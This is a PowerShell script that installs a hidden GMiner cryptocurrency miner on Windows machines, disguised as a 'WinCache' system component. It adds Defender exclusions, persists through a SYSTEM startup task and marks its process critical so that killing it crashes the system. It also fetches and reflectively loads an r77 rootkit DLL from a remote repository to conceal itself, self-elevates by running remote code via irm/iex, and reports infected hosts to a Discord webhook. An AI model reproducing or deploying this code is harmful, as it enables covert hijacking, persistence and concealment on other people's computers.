#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
    Includes Safe Update, Critical Process (with Safe Shutdown), and r77 Rootkit.
    NOTE: This version DOES NOT include the -Uninstall switch.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- paths -----------------------------------------------------------
$RemoteUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'
$Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir    = Join-Path $Root 'logs'
$ExePath   = Join-Path $Root 'WinCache.exe'
$SelfPs    = Join-Path $Root 'WinCache.ps1'
$LogFile   = Join-Path $LogDir 'cache.log'
$TaskName  = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class ProcessProtector {
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int infoClass, ref int info, int infoLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetConsoleCtrlHandler(CtrlHandler handler, bool add);

    delegate bool CtrlHandler(int ctrlType);
    static CtrlHandler _handler;

    static IntPtr _hProcess = IntPtr.Zero;
    static int _isCritical = 1;
    const int ProcessBreakOnTermination = 0x1D;

    public static void SetCriticalForPid(int pid, bool critical) {
        _isCritical = critical ? 1 : 0;
        try {
            IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
            NtSetInformationProcess(hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
        } catch {}
    }

    public static void RegisterShutdownHandler() {
        _hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
        _handler = new CtrlHandler(HandleCtrl);
        SetConsoleCtrlHandler(_handler, true);
    }

    static bool HandleCtrl(int ctrlType) {
        if (ctrlType == 2 || ctrlType == 5 || ctrlType == 6) {
            _isCritical = 0;
            if (_hProcess != IntPtr.Zero) {
                NtSetInformationProcess(_hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
            }
        }
        return false;
    }
}
"@

function Send-DiscordWebhook {
    param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    $payload = [ordered]@{
        embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

function Stop-Safe {
    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
    foreach ($w in $watchers) {
        [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 1
    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado.' } else { Write-Host '[-] Falló.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }

    Section 'Install path'
    Line 'Root'        $Root
    Line 'Exists'      (Test-Path $Root)
    Line 'WinCache.exe'(Test-Path $ExePath)
    Line 'WinCache.ps1'(Test-Path $SelfPs)
    Line 'cache.log'   $LogFile

    Section 'Scheduled Task'
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) { Line 'State' $task.State } else { Write-Host '  No hay tarea programada.' -ForegroundColor Yellow }

    Section 'Processes'
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }

    Section 'Last 10 lines of cache.log'
    if (Test-Path $LogFile) { Get-Content $LogFile -Tail 10 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
    Write-Host ''
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-Command', "iex ""& { `$(irm '$RemoteUrl') } ")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) { if ($v) { $a[3] += "-$k " } }
            else { $a[3] += "-$k '$v' " }
        }
        $a[3] += "-NoElevate"""
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
    }

    [ProcessProtector]::SetCriticalForPid($PID, $true)
    [ProcessProtector]::RegisterShutdownHandler()
    Write-Session "Watcher iniciado (PID $PID) - Crítico con Safe-Shutdown."

    # --- ROOTKIT ---
    try {
        $bytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll")  
        $asm = [Reflection.Assembly]::Load($bytes)  
        $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String')  
        $rk.Close()  
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord')  
        $rk.Close()  
        Write-Session "Rootkit r77 cargado y configurado."
    } catch { Write-Session "Error en rootkit: $_" 'WARN' }

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"
    $restarts = 0
    $notifiedStart = $false

    while ($true) {
        Write-Session "launching miner (attempt $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $ExePath; $psi.Arguments = $argStr; $psi.WorkingDirectory = $Root
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.CreateNoWindow = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process; $proc.StartInfo = $psi
        
        try {
            $proc.Start() | Out-Null
            try {
                $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
                $rk.SetValue([IO.Path]::GetRandomFileName(), $proc.Id, 'DWord'); $rk.Close()  
            } catch {}

            if (-not $notifiedStart -and $DiscordWebhook) {
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Protecciones Activadas)*"
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "Fallo al iniciar: $_" 'FATAL'
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $sub = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action { if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) } } -MessageData $q
        $proc.BeginOutputReadLine()

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $lvl = if ($line -match $fatalRe) { 'FATAL' } else { 'INFO' }
                Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$lvl] $line" -Encoding UTF8
            } else { Start-Sleep -Milliseconds 200 }
        }

        $proc.WaitForExit()
        Unregister-Event -SourceIdentifier $sub.Name -ErrorAction SilentlyContinue
        $proc.Dispose()
        
        $restarts++
        if ($restarts -ge 10) { break }
        Start-Sleep -Seconds 30
    }
    exit 0
}

# ---------- folders & defender ----------------------------------------------
foreach ($d in @($Root, $LogDir)) { if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } }
try { $item = Get-Item $Root -Force; if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden } } catch {}

try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
} catch {}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Descargando GMiner...'
    $rel = Invoke-RestMethod -Uri 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest' -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    $tmp = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}' -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
}

# ---------- worker hash -----------------------------------------------------
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
    $hash = $sha.ComputeHash($bytes); $sha.Dispose()
    $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
}

# ---------- install self (Soporte para iwr | iex) ---------------------------
if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
    Copy-Item $scriptPath $SelfPs -Force
    Unblock-File $SelfPs -ErrorAction SilentlyContinue
} elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
    Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
    Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
}

$head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }

# ---------- safe update & scheduled task ------------------------------------
Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
Stop-Safe
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null
Write-Host "[+] Tarea programada actualizada."

# ---------- launch watcher --------------------------------------------------
$p = $null
if ($Foreground) {
    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
} else {
    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
    Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
}

if ($DiscordWebhook) {
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado."
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Actualización Exitosa" -Message $msg -Color 3066993 | Out-Null
}
